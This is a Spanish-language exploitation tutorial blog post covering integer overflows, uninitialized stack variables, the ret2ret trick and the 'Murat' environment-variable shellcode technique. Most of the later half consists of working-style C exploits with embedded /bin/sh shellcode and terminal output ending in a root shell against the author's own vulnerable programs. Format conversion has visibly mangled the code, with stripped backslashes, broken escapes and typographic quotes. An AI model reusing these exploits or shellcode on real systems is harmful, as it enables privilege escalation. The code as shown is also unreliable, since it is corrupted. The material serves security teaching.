---
layout: es/blog-detail
comments: true
title: "Métodos complementarios : The Byte at the End of the Universe Stack"
date: 2018-07-24T14:47:00+00:00
categories:
    - Exploiting
tags:
    - 32 bit
    - integer overflow
    - murat
    - murat
    - ret2ret
    - ret2ret
image_src: /assets/uploads/2018/07/Shellcodes-el-codigo-de-la-exploiting-puffin-security.jpg
image_height: 300
image_width: 450
author: Yago Gutierrez
description: Muy buenas, este post estará dedicado a un par de, creo que «técnicas» se podrían llamar, que pueden ser interesantes. La primera es realmente muy importante. Se trata de los integer overflow. Métodos 0x9c90928f939a929a918b9e8d96908c Primero demos un repaso a cómo se almacenan los valores numéricos...
publish_time: 2018-07-24T14:47:00+00:00
modified_time: 2019-11-13T08:26:13+00:00
comments_value: 0
---
Muy buenas, este post estará dedicado a un par de, creo que «técnicas» se podrían llamar, que pueden ser interesantes. La primera es realmente **muy** importante. Se trata de los [**_integer overflow_**](http://phrack.org/issues/60/10.html).

#### Métodos 0x9c90928f939a929a918b9e8d96908c

Primero demos un repaso a cómo se almacenan los valores numéricos en memoria. Existen dos tipos esenciales para almacenar valores: `int` y `char`, siendo el `int` de al menos 16 bits, si bien en arquitecturas x86 y x86\_64 siempre será de 32 bits (el más común) o incluso 64 bits (solo en x86\_64, pero es poco común). Por otra parte, `char` debe ser siempre de 8 bits, aunque teóricamente su tamaño está definido en la cabecera `<limits.h>`, mediante la macro `CHAR_BIT`, ya que antiguamente los ordenadores empleaban un `char` de 7 bits, debido a que el ASCII regular (el ASCII regular es al ASCII lo que el Antiguo Testamento a la Biblia, Corán, etc) es de solo 128 valores (`127 = 01111111b`, 7 bits), posteriormente se añadió el ASCII extendido, con 128 valores más, siendo necesario aumentar el tamaño de `char` a 8 bits. Hoy en día es imposible encontrar una máquina que use un `char` de 7 bits.

Veamos ahora cómo se representa un valor negativo. En un principio se empleaba el _complemento a 1_, es decir, si representamos en binario el 1 de la siguiente forma (como valor de 8 bits): 00000001b (la ‘b’ del final indica que está en binario), el -1 sería 11111110b, es decir, su complementario. El 117 es en binario 01110101b, por lo que el -117 sería 10001010b. Sin embargo esto implicaría la existencia de un 0 (00000000b) y de un -0 (11111111b), cuando esta diferencia no es real, por lo que para aprovechar bien todo el espacio de posibilidades, se emplea el _**complemento a 2**_, que se calcula sumando 1 al complemento a 1. Es decir, el -1 sería el complemento a 1 de 00000001b más 1, que es `11111110b + 1 = 11111111b`. El -117 ahora sería 10001011b.

Quiero hacer notar cómo el primer bit actúa de alguna manera como signo, por eso en variables tipo `signed` se emplea el primer bit para saber si es positivo o negativo (1 para el negativo y 0 para el positivo). Por eso en variables como `signed int` (para un `int` de 32 bits) el rango es desde (-231) hasta (+231\-1), es decir, desde -2147483648 hasta +2147483647 (empleando el complemento a 1 el rango sería desde -2147483647 hasta +2147483647), mientras que un `unsigned int` (de 32 bits) tiene un rango de desde 0 hasta 232, es decir, de 0 a 4294967296. Se puede observar que la cantidad de números representable con un `unsigned` es igual a la cantidad de números representable con un `signed`, si bien el valor absoluto máximo de un `signed` es la mitad que un `unsigned` debido a que se emplea un bit para indicar el signo y solo 31 bits para indicar el valor. Indicar por último que por defecto, en C, todas las variables son `signed`.

Y ahora el caramelo, es muy común que un programador emplee variables sin indicar que son `unsigned` para realizar comprobaciones de tamaño (un tamaño no debería poder ser negativo) y luego emplear esa misma variable en otras funciones, pudiéndose producir un _buffer underflow_, o, más comúnmente, un _buffer overflow_. Veamos un ejemplo  

    #include <stdio.h>
    #include <stdlib.h>

int main(int argc, char\*\* argv)  
{  
signed int len, leidos;  
char buf\[256\];

if(argc < 2) return 1;

len = atoi(argv\[1\]);  
printf(«Tamaño recibido: %dn», len);

/\* sizeof() es un operador que devuelve size\_t  
(unsigned int), al comparar un valor signed  
con uno unsigned, el signed sufre un cast  
que lo convierte a unsigned, así que lo  
evitamos \*/  
// if(len >= sizeof(buf))  
if(len >= 256)  
{  
printf(«%u >= 256n», len);  
printf(«Máximo a leer: 256n»);  
leidos = fread(buf, sizeof(char), sizeof(buf), stdin);  
}  
else  
{  
printf(«%u < 256n», len);  
printf(«Máximo a leer: signed:%dtunsigned:%1$un»);  
leidos = fread(buf, sizeof(char), len, stdin);  
}

printf(«Leídos: %dn», leidos);

return 0;  
}

Se declara un buffer de 256 bytes en el cual se leerá desde el stdin. El usuario indica al programa la longitud de los datos que debe leer en el buffer mediante un argumento numérico. Antes de copiar se comprueba si el valor proporcionado por el usuario es mayor que 256, en ese caso se leen 256 bytes, en caso de que la cantidad indicada por el usuario sea menor que 256, se leerá exactamente esa cantidad.

El problema se encuentra en el `if`, ya que la variable `len` es `signed`, por lo que el usuario puede introducir un valor negativo, como `-1`. Esto hará que en el `if` se compruebe `-1 >= 256`, que al ser falso lo lleve a ejecutar el `else`, donde se lee la cantidad de bytes que proporciona el usuario. Resulta que el parámetro `nmiemb` de `fread()` es de tipo `size_t` (que en la librería se define mediante un `typedef` como `unsigned int`), por lo que se hace un _cast_ a `unsigned`, quedando como argumento 4294967295, pudiendo overflowear de esa manera el buffer. Vamos a verlo.  

    $ perl -e 'print "A"x10' | ./b 10
    Tamaño recibido: 10
    10 < 256
    Máximo a leer: signed:10    unsigned:10
    Leídos: 10

$ perl -e ‘print «A»x1000’ | ./b 10  
Tamaño recibido: 10  
10 < 256  
Máximo a leer: signed:10 unsigned:10  
Leídos: 10

$ perl -e ‘print «A»x3’ | ./b 10  
Tamaño recibido: 10  
10 < 256  
Máximo a leer: signed:10 unsigned:10  
Leídos: 3

arget@plata:~$ perl -e ‘print «A»x3’ | ./b 300  
Tamaño recibido: 300  
300 >= 256  
Máximo a leer: 256  
Leídos: 3

$ perl -e ‘print «A»x290’ | ./b 300  
Tamaño recibido: 300  
300 >= 256  
Máximo a leer: 256  
Leídos: 256

$ perl -e ‘print «A»x256’ | ./b 300  
Tamaño recibido: 300  
300 >= 256  
Máximo a leer: 256  
Leídos: 256

$ perl -e ‘print «A»x257’ | ./b 300  
Tamaño recibido: 300  
300 >= 256  
Máximo a leer: 256  
Leídos: 256

$ perl -e ‘print «A»x257’ | ./b 256  
Tamaño recibido: 256  
256 >= 256  
Máximo a leer: 256  
Leídos: 256

En un principio no parece haber ningún error lógico. Vamos a hacer la magia de una vez  

    $ perl -e 'print "A"x1000' | ./b -1
    Tamaño recibido: -1
    4294967295 < 256
    Máximo a leer: signed:-1    unsigned:4294967295
    Leídos: 1000
    Violación de segmento

Pues ahí está, sencillito. Es ya evidente el método de explotación.

Ah, por cierto

    #include <stdio.h>
    #include <stdint.h>
    #include <string.h>

int main(argc, argv)  
int argc;  
uint8\_t\*\* argv;  
{  
uint32\_t i, l;

if(argc < 2) return 1;

l = strlen(argv\[1\]);  
for(i = 0; i < l; i++)  
argv\[1\]\[i\] = ~argv\[1\]\[i\];

printf(«0x»);  
for(i = 0; i < l; i++)  
printf(«%02x», argv\[1\]\[i\]);  
putchar(‘n’);

return 0;  
}

A ver quién no pilla el sentido del título ahora…  
0x8b90918b90df9a93df8e8a9adf9390df939a9e jajajaj tenía que hacerlo, lo siento mucho.

Sigamos. Existe otro tipo de desbordamiento de enteros: Teniendo en cuenta que existe un espacio limitado, cuando ese espacio es superado, se truncan los bits que lo superan. Si una variable `char` (de 8 bits) contiene el valor 255 (0xff, 11111111b), y se suma en uno, el resultado debería ser 0x0100 (100000000b), un resultado de 9 bits, luego el resultado guardado al final en la variable será 0x00.  
El siguiente código:

    #include <stdio.h>

int main()  
{  
char c;  
c = 255;  
printf(«%hhun», c); // El modificador «hh» indica que…, espera, esto no es un manual  
c++;  
printf(«%hhun», c);

return 0;  
}

Da como resultado

$ ./c
255
0

Vamos a ver un ejemplo de integer overflow en la vida real. Una vulnerabilidad descubierta en 2016 (CVE-2016-9066) afectaba a Thunderbird < 45.5, Firefox ESR < 45.5, y Firefox < 50 ([bug: 1299686](https://bugzilla.mozilla.org/show_bug.cgi?id=1299686)). Observad el siguiente código:

nsresult
nsScriptLoadHandler::TryDecodeRawData(const uint8\_t\* aData,
                                      uint32\_t aDataLength,
                                      bool aEndOfStream)
{
  int32\_t srcLen = aDataLength;
  const char\* src = reinterpret\_cast<const char \*>(aData);
  int32\_t dstLen;
  nsresult rv =
    mDecoder->GetMaxLength(src, srcLen, &dstLen);

NS\_ENSURE\_SUCCESS(rv, rv);

uint32\_t haveRead = mBuffer.length();  
uint32\_t capacity = haveRead + dstLen; // \[\[ 1 \]\]  
if (!mBuffer.reserve(capacity)) {  
return NS\_ERROR\_OUT\_OF\_MEMORY;  
}

rv = mDecoder->Convert(src,  
&srcLen,  
mBuffer.begin() + haveRead,  
&dstLen);

NS\_ENSURE\_SUCCESS(rv, rv);

haveRead += dstLen;  
MOZ\_ASSERT(haveRead <= capacity, «mDecoder produced more data than expected»);  
MOZ\_ALWAYS\_TRUE(mBuffer.resizeUninitialized(haveRead));

return NS\_OK;  
}

A grandes rasgos lo que hace la función es obtener el tamaño de los datos recibidos por última vez del servidor y, en la línea marcada con `[[ 1 ]]`, se calcula una nueva capacidad para `mBuffer`, para reasignarle un nuevo tamaño mediante el método `mBuffer.reserve()`.  
La vulnerabilidad se explota si el servidor envía más de 4GB de datos (si bien pueden ser comprimidos para que por la red solo circulen, según el PoC publicado, 18MB), ya que producirá un desbordamiento de entero en `capacity`. Si `capacity` adquiere un valor menor a la longitud previa de `mBuffer`, el tamaño de `mBuffer` no será modificado. En consecuencia, `mDecoder()` terminará escribiendo más allá del final del buffer. Es un muy buen ejemplo de cómo un integer overflow puede desencadenar un buffer overflow, en este caso en el heap.

Otro grave problema que se comete con relativa frecuencia es el uso de **variables no inicializadas**. Algo como el siguiente código puede ocurrir con facilidad:

    #include <stdio.h>

int main()  
{  
int i;  
while(i < 100)  
printf(«%dn», i++);  
return 0;  
}

En este caso no va a ocurrir nada grave, ya que el stack se encuentra limpio todavía cuando main() es ejecutado, y se va a comportar de igual manera que si `i` hubiese sido inicializado a 0. Pero en el siguiente ejemplo (bastante surrealista) vemos lo que puede llegar a ocurrir.

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

void f2(void)  
{  
int c;  
if(c == 0xdeadbeef)  
{  
setuid(0);  
system(«/bin/sh»);  
}  
}

void f1(int b)  
{  
int a = b;  
}

int main(int argc, char\*\* argv)  
{  
if(argc < 2) return 1;  
f1(atoi(argv\[1\]));  
f2();  
return 0;  
}

En un principio parece imposible que se ejecute el interior del `if` en `f2()`. Pero no es así:

$ gcc a.c -o a

$ sudo chown root:root a

$ sudo chmod u+s a

$ ./a 1

$ ./a 2

$ ./a 1000

$ ./a 10000000

$ ./a 3735928559  
\# whoami  
root  
#

¿Qué clase de magia es esta?

Primero tengamos en cuenta que `3735928559` es en hex `0xdeadbeef`.

Lo que ocurre es que la función `f2()` va a ocupar exactamente el mismo marco de stack que `f1()`, quedando la variable `c` de `f2()` exactamente en el mismo sitio donde quedó la variable `a` de `f1()`. Al no estar inicializada en `f2()`, `c` mantendrá el valor que contenía `a` durante la ejecución de `f1()`.

Este tipo de errores se hace particularmente difícil de detectar cuando la variable que se emplea sin inicializar se ha pasado a otra como un puntero.

Es realmente interesante explotar este tipo de vulnerabilidades, especialmente cuando los marcos de stack no coinciden de una manera tan clara, pues hay que estudiar cómo modificando los valores de las funciones anteriores puedes lograr situar en la variable que te interesa de la función vulnerable el valor correcto.

Vamos ahora con una técnica de la que poco se habla por las condiciones específicas que requiere, pero yo creo que puede útil en ciertos momentos.

_**ret2ret**_: Cuando te levantas perezoso.

Esta técnica es solo aplicable a funciones a las que se les pasa como argumento un puntero a nuestra fruta (y que podamos situar al comienzo de la misma un shellcode o una instrucción que nos permita llegar a él, por ejemplo, en una petición HTTP nos sería imposible, ya que deben comenzar con el método que se emplea, ya sea `GET`, `POST`, `HEAD`… A no ser que luego el cuerpo de la petición sea pasado a una función que sea la que contiene la vulnerabilidad, claro). Ah, y otra condición es que la convención de llamada sea cdecl, ya que es necesario que se pasen los argumentos por el stack.  
Funciona debido a cómo queda el stack justo tras efectuar una llamada y justo antes de efectuar el `ret` del final de la función _callee_ (_caller_ para la que llama, y _callee_ para la llamada). Es decir, así

+--------------------+
|        arg1        | <- &shellcode
+--------------------+
|       EIP(s)       | <- &ret
+--------------------+

Al colocar en `EIP(s)` una dirección a un `ret`, esta dirección será tomada al llegar al final de la función, cuando se ejecute nuestro `ret` se recogerá en EIP el argumento que se ha pasado a la función que estamos explotando, que, como ya he dicho, deberá ser una dirección a nuestra fruta. Es evidentemente una forma de bypassear ASLR, pero solo es útil si ya tienes permisos de ejecución en el área de tu shellcode.

Finalmente, y por añadir una más, ya que esta otra técnica creo que es más bien omisible, pero el conocimiento no ocupa lugar, o eso dicen…, Sherlock Holmes dijo lo contrario…, sobre saber que la Tierra gira alrededor del Sol…, ¿o realmente fue Doyle quien lo dijo a través del personaje?… Esta es la técnica… _La Técnica de Murat_.

_**La Técnica de Murat: The byte at the End of the Universe stack**, el byte de Higgs_

Qué buen subtítulo, creo que lo voy a poner en el título principal… La técnica de Murat (o al menos así la bautizó blackngel) es útil en _privesc_, ya que consiste en ejecutar el programa explotado con un entorno casi nulo, con una única variable de entorno, la cual contiene el shellcode. Podemos ver el PoC que emplea blackngel en su [artículo de SET](http://www.set-ezine.org/index.php?num=37&art=6) (el artículo hace referencia a Buffer Overflows Demystified, de Murat, si bien esa página ya no existe, pero la info en aquella época corría por internet \[_rushing through the phone line_\] _like heroin through an addict’s veins_, así que fue fácil encontrarla en [otro sitio](http://www.enderunix.org/docs/en/bof-eng.txt)).

    #include <stdlib.h>
    #include <stdio.h>
    #include <string.h>

#define BSIZE 144  
#define NOMBRE «./murat»

char shellcode\[\] =  
«x31xc0x31xdbxb0x17xcdx80»  
«xebx1fx5ex89x76x08x31xc0x88x46x07x89x46»  
«x0cxb0x0bx89xf3x8dx4ex08x8dx56x0cxcdx80»  
«x31xdbx89xd8x40xcdx80xe8xdcxffxffxff/bin/sh»;

void main(int argc, char \*argv\[\]) {

char \*p;  
char \*env\[\] = {shellcode, NULL};  
char \*vuln\[\] = {NOMBRE, p, NULL};  
int \*ptr, addr;  
int size;  
int i;

size = BSIZE;

p = (char \*) malloc(size \* sizeof(char));  
if(p == NULL) {  
fprintf(stderr, «nMemoria insuficienten»);  
exit(0);  
}

addr = 0xbffffffa – strlen(shellcode) – strlen(NOMBRE) – 1;  
printf(«Usando direccion: \[ %08x \]n», addr);

ptr = (int \*)p;  
for (i = 0; i < BSIZE; i += 4)  
\*(ptr++) = addr;

execle(vuln\[0\], vuln, p, NULL, env);  
}

Y está pensado para explotar el siguiente código

#include <stdio.h>
#include <string.h>

int main(int argc, char \*argv\[\])  
{  
char buff\[10\];  
strcpy(buff, argv\[1\]);  
return 0;  
}

El principio que se emplea en el exploit para calcular la dirección del shellcode en el stack se basa en cómo se encuentra organizado el stack. En _el comienzo del stack_ (otro buen título), que, antaño era 0xbfffffff, encontramos simplemente un 0x00000000 indicador de que más allá es el fin del mundo, una señal para los navegantes incautos que osaban sobrepasar Finisterre… ejem, que me voy . Antes (o tras) del `NULL` encontramos el nombre del programa (no es `argv[0]`), y a continuación las variables del entorno.  
Por eso el método que se emplea para conocer la dirección del shellcode (introducido en una variable del entorno), es restar a 0xbfffffff primero 4 bytes (los del `NULL`), luego restar la longitud del nombre del programa (que está terminado con un byte nulo, de ahí el `-1` al final de la sentencia), y finalmente, para obtener la dirección del comienzo del shellcode (porque ya tenemos la dirección justo al final del shellcode), restamos la longitud del shellcode.

Hoy en día, el tope del stack se encuentra en 0xffffe000, siendo el último byte legible el 0xffffdfff. Y se termina con dos `NULL`‘s (en lugar de solo uno), por lo que el exploit habrá que modificarlo un poco.

**Aclarar primero que esto es aplicable solo a un sistema sin ASLR. Esta técnica es hoy en día más bien una curiosidad, a no ser que se consiga desactivar primero el ASLR por alguna mala configuración, esta técnica no es aplicable hoy en día. Tampoco hay que olvidarse de que hoy en día el stack no es ejecutable, luego esta técnica se podrá usar en conjunción con otras que primero nos den permisos de ejecución, como ROP.**

Nosotros explotaremos nuestro programita de siempre (porque el gcc actual convierte el stack de main() en un pantano), aunque con un buffer más pequeño, para hacerlo similar al de nuestro amigo:

    #include <stdio.h>
    #include <string.h>

void imprimir(char\* arg)  
{  
char buffer\[10\];  
strcpy(buffer, arg);  
}

int main(int argc, char\*\* argv)  
{  
imprimir(argv\[1\]);  
return 0;  
}

Y el exploit:

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>

#define RELLENO 22  
#define RUTA «./vuln»

char shellcode\[\] =  
«x31xc0x50x68x2fx2fx73x68x68x2fx62x69x6ex89xe3x50»  
«x53x89xe1x31xd2xb0x0bxcdx80»;

void panic(char\* s)  
{  
perror(s);  
exit(-1);  
}

int main(int argc, char\*\* argv)  
{  
char arg\[RELLENO + sizeof(void\*)\];  
char\* env\[\] = {shellcode, NULL};  
uint32\_t\* addr;  
int i;

for(i = 0; i < RELLENO; i++)  
arg\[i\] = ‘A’;

addr = (int\*)(arg + RELLENO);  
\*addr = 0xffffe000 – 4 \* 2 – (strlen(RUTA) + 1) – (strlen(shellcode) + 1);  
printf(«Usando direccion: \[ %p \]n», \*addr);

printf(«Payload: «);  
for(i = 0; i < RELLENO + 4; i++)  
printf(«%02x», (unsigned char) arg\[i\]);  
putchar(‘n’);

execle(RUTA, RUTA, arg, NULL, env);  
panic(«Error en execle()»);  
}

Aparte de las diferencias de estilo (y que yo he usado un shellcode un tanto mejor), se aprecia en la línea

\*addr = 0xffffe000 - 4 \* 2 - (strlen(RUTA) + 1) - (strlen(shellcode) + 1);

las diferencias a la hora de calcular la dirección del shellcode. La más evidente es que antes el stack comenzaba en 0xbfffffff, ahora en 0xffffe000. Otra importante es que, como ya hemos comentado, antaño en el tope del stack se encontraba un `0x00000000`, actualmente son dos, de ahí que en lugar de aparecer un simple `-4`, aparezca un `-4*2`, para restar los 8 bytes que suman los dos `0x00000000`. A esto se le resta la longitud del nombre del programa y la longitud del shellcode. Me es particularmente gracioso cómo blackngel, tanto en el artículo como en el libro que publicó hace ya un tiempo, indica que a esto hay que sumarle _normalmente_ un byte «extra», sin dar explicaciones. Ese byte «extra» se debe restar siempre, ya que es el byte que termina la cadena del nombre del programa. Igualmente, no me explico que no se mencione otro byte «extra» que se debe restar que es el que termina la variable del entorno con nuestro shellcode, ya que, aunque se trata de un valor binario, no de una cadena (está compuesta por caracteres no imprimibles) en el exploit lo hemos definido como una cadena (se encuentra en comillas), y en caso de que lo definamos como un array de char’s y no lo terminemos con un byte nulo, a la hora de situar execve() (llamado por execle()) las variables del entorno en el stack del nuevo proceso, no sabrá cuándo terminar de leer, leyendo (y escribiendo cada byte leído en el stack del nuevo proceso) hasta encontrar un byte nulo, ya que espera que cada variable del entorno sea una cadena. Luego ese byte nulo **_debe_** existir.

Si alguien desea hacer la prueba sobre esto último, debe definir el array `shellcode` dentro de una función, ya que, si se declara como global, se situará en la sección `.data`, donde, con casi total seguridad, se colocará al final de dicha seccìón. Cada sección está terminada por al menos un 0x00000000, por lo que encontraríamos que nuestro shellcode ha sido terminado por un byte nulo y no podremos experimentar la necesidad de definir las variables del entorno como strings.

    int main()
    {
        char shellcode[] = {0x31, 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68,
                            0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x50,
                            0x53, 0x89, 0xe1, 0x31, 0xd2, 0xb0, 0x0b, 0xcd,
                            0x80};
        [...]
    }

Una vez hecho esto se podrá proceder a examinar el stack del proceso víctima:

$ gdb -q ./vuln
Reading symbols from ./vuln...(no debugging symbols found)...done.
(gdb) set exec-wrapper ./x
(gdb) br \*imprimir +26
Breakpoint 1 at 0x8048425
(gdb) run
Starting program: /home/arget/vuln 
Usando direccion: \[ 0xffffdfd8 \]
Payload: 41414141414141414141414141414141414141414141d8dfffff

Breakpoint 1, 0x08048425 in imprimir ()  
(gdb) display /i $pc  
1: x/i $pc  
\=> 0x8048425 <imprimir+26>: ret  
(gdb) nexti  
0xffffdfd8 in ?? ()  
1: x/i $pc  
\=> 0xffffdfd8: jae 0xffffe042  
(gdb) x $eip  
0xffffdfd8: 0x2f686873  
(gdb)  
0xffffdfdc: 0x896e6962  
(gdb)  
0xffffdfe0: 0x895350e3  
(gdb)  
0xffffdfe4: 0xb0d231e1  
(gdb)  
0xffffdfe8: 0x2b80cd0b  
(gdb)  
0xffffdfec: 0x1affffd3  
(gdb)  
0xffffdff0: 0x762f2e00  
(gdb)  
0xffffdff4: 0x006e6c75  
(gdb)  
0xffffdff8: 0x00000000  
(gdb)  
0xffffdffc: 0x00000000  
(gdb)  
0xffffe000: Cannot access memory at address 0xffffe000 // Es el fin del mundo, claro (llamado _kernel land_)  
(gdb) x/s 0xffffdff0+1  
0xffffdff1: «./vuln»

Vemos justo tras el `cd 80` (opcodes para `int 0x80`) final de nuestro shellcode, una serie de datos, en concreto vemos los siguientes bytes (en hex, por supuesto): `2b d3 ff ff 1a 00`, y a continuación, la cadena «./vuln». Esos datos, teniendo en cuenta que esto es little endian (amigo), son una dirección y otra a medias, en concreto `0xffffd32b` y `0x????001a` (la segunda, supongo que es una dirección ya que debe encontrarse en el stack de la función `imprimir()`, y ahí no hay ninguna cadena que contenga `0x1a`, que es adeḿás no imprimible, luego es de esperar que sea el final de una dirección). Estas dos direcciones se corresponden con el stack del exploit. Que esto sirva como una introducción a los _memory leaks_.  
Se puede ver, por el tipo de direcciones filtradas, que el exploit fue compilado como 32 bits, simplemente la costumbre me llevó a compilarlo con la opción `-m32`, pero podemos ver que el error ocurre igual si es compilado para 64 bits.

    $ gdb -q vuln
    Reading symbols from vuln...(no debugging symbols found)...done.
    (gdb) br *imprimir +26
    Breakpoint 1 at 0x8048425
    (gdb) set exec-wrapper ./x
    (gdb) run
    Starting program: /home/arget/vuln 
    Usando direccion: [ 0xffffdfd8 ]
    Payload: 41414141414141414141414141414141414141414141d8dfffff

Breakpoint 1, 0x08048425 in imprimir ()  
(gdb) display /i $pc  
1: x/i $pc  
\=> 0x8048425 <imprimir+26>: ret  
(gdb) nexti  
0xffffdfd8 in ?? ()  
1: x/i $pc  
\=> 0xffffdfd8: jae 0xffffe042  
(gdb) x $eip  
0xffffdfd8: 0x2f686873  
(gdb)  
0xffffdfdc: 0x896e6962  
(gdb)  
0xffffdfe0: 0x895350e3  
(gdb)  
0xffffdfe4: 0xb0d231e1  
(gdb)  
0xffffdfe8: 0x4680cd0b  
(gdb)  
0xffffdfec: 0x55555555  
(gdb)  
0xffffdff0: 0x762f2e00  
(gdb)  
0xffffdff4: 0x006e6c75  
(gdb)  
0xffffdff8: 0x00000000  
(gdb)  
0xffffdffc: 0x00000000  
(gdb)  
0xffffe000: Cannot access memory at address 0xffffe000 // Dragones y monstruos del averno

Ahora encontramos `46 55 55 55 55 00` tras el shellcode. Teniendo en cuenta que las direcciones del stack de un proceso de 64 bits (sin ASLR) son de la forma `0x55555555????`, comprobamos que ahí, se encuentra una dirección parcial. El byte nulo que detuvo el _memory leak_ no sabemos a qué se corresponde pues se encontraba justo antes de la dirección que se ha filtrado. Dirección a la que, además, le falta un byte, ya que ha sido sobrescrito por nuestro shellcode, seguramente se trata de una dirección residual que se encontraba en el stack, dejada ahí por una función anterior.

En fin, una vez demostrado el por qué se requiere restar en uno la dirección, debido al byte terminador del nombre del programa, y restar otro byte más, debido al byte terminador de la variable del entorno, procedemos a demostrar el PoC _correcto_.

    $ gcc x.c -o x
    $ ./x
    Usando direccion: [ 0xffffdfd7 ]
    Payload: 41414141414141414141414141414141414141414141d7dfffff
    # whoami
    root
    # 

La verdad que es más elegante emplear un exploit en un «programa/script» que mediante un comando _one-line_, pero _yo soy yo y mis…_ manías \[_y si no la salvo a ella no me salvo yo_\] — ¿Ortega y Gasset? ¿Quiénes son esos?

Y aquí terminamos un _post_ pletórico de referencias (meh en realidad tampoco son tantas), en fin, hoy me sentía así.  
Buenas tardes, _que_ el byte _os acompañe_.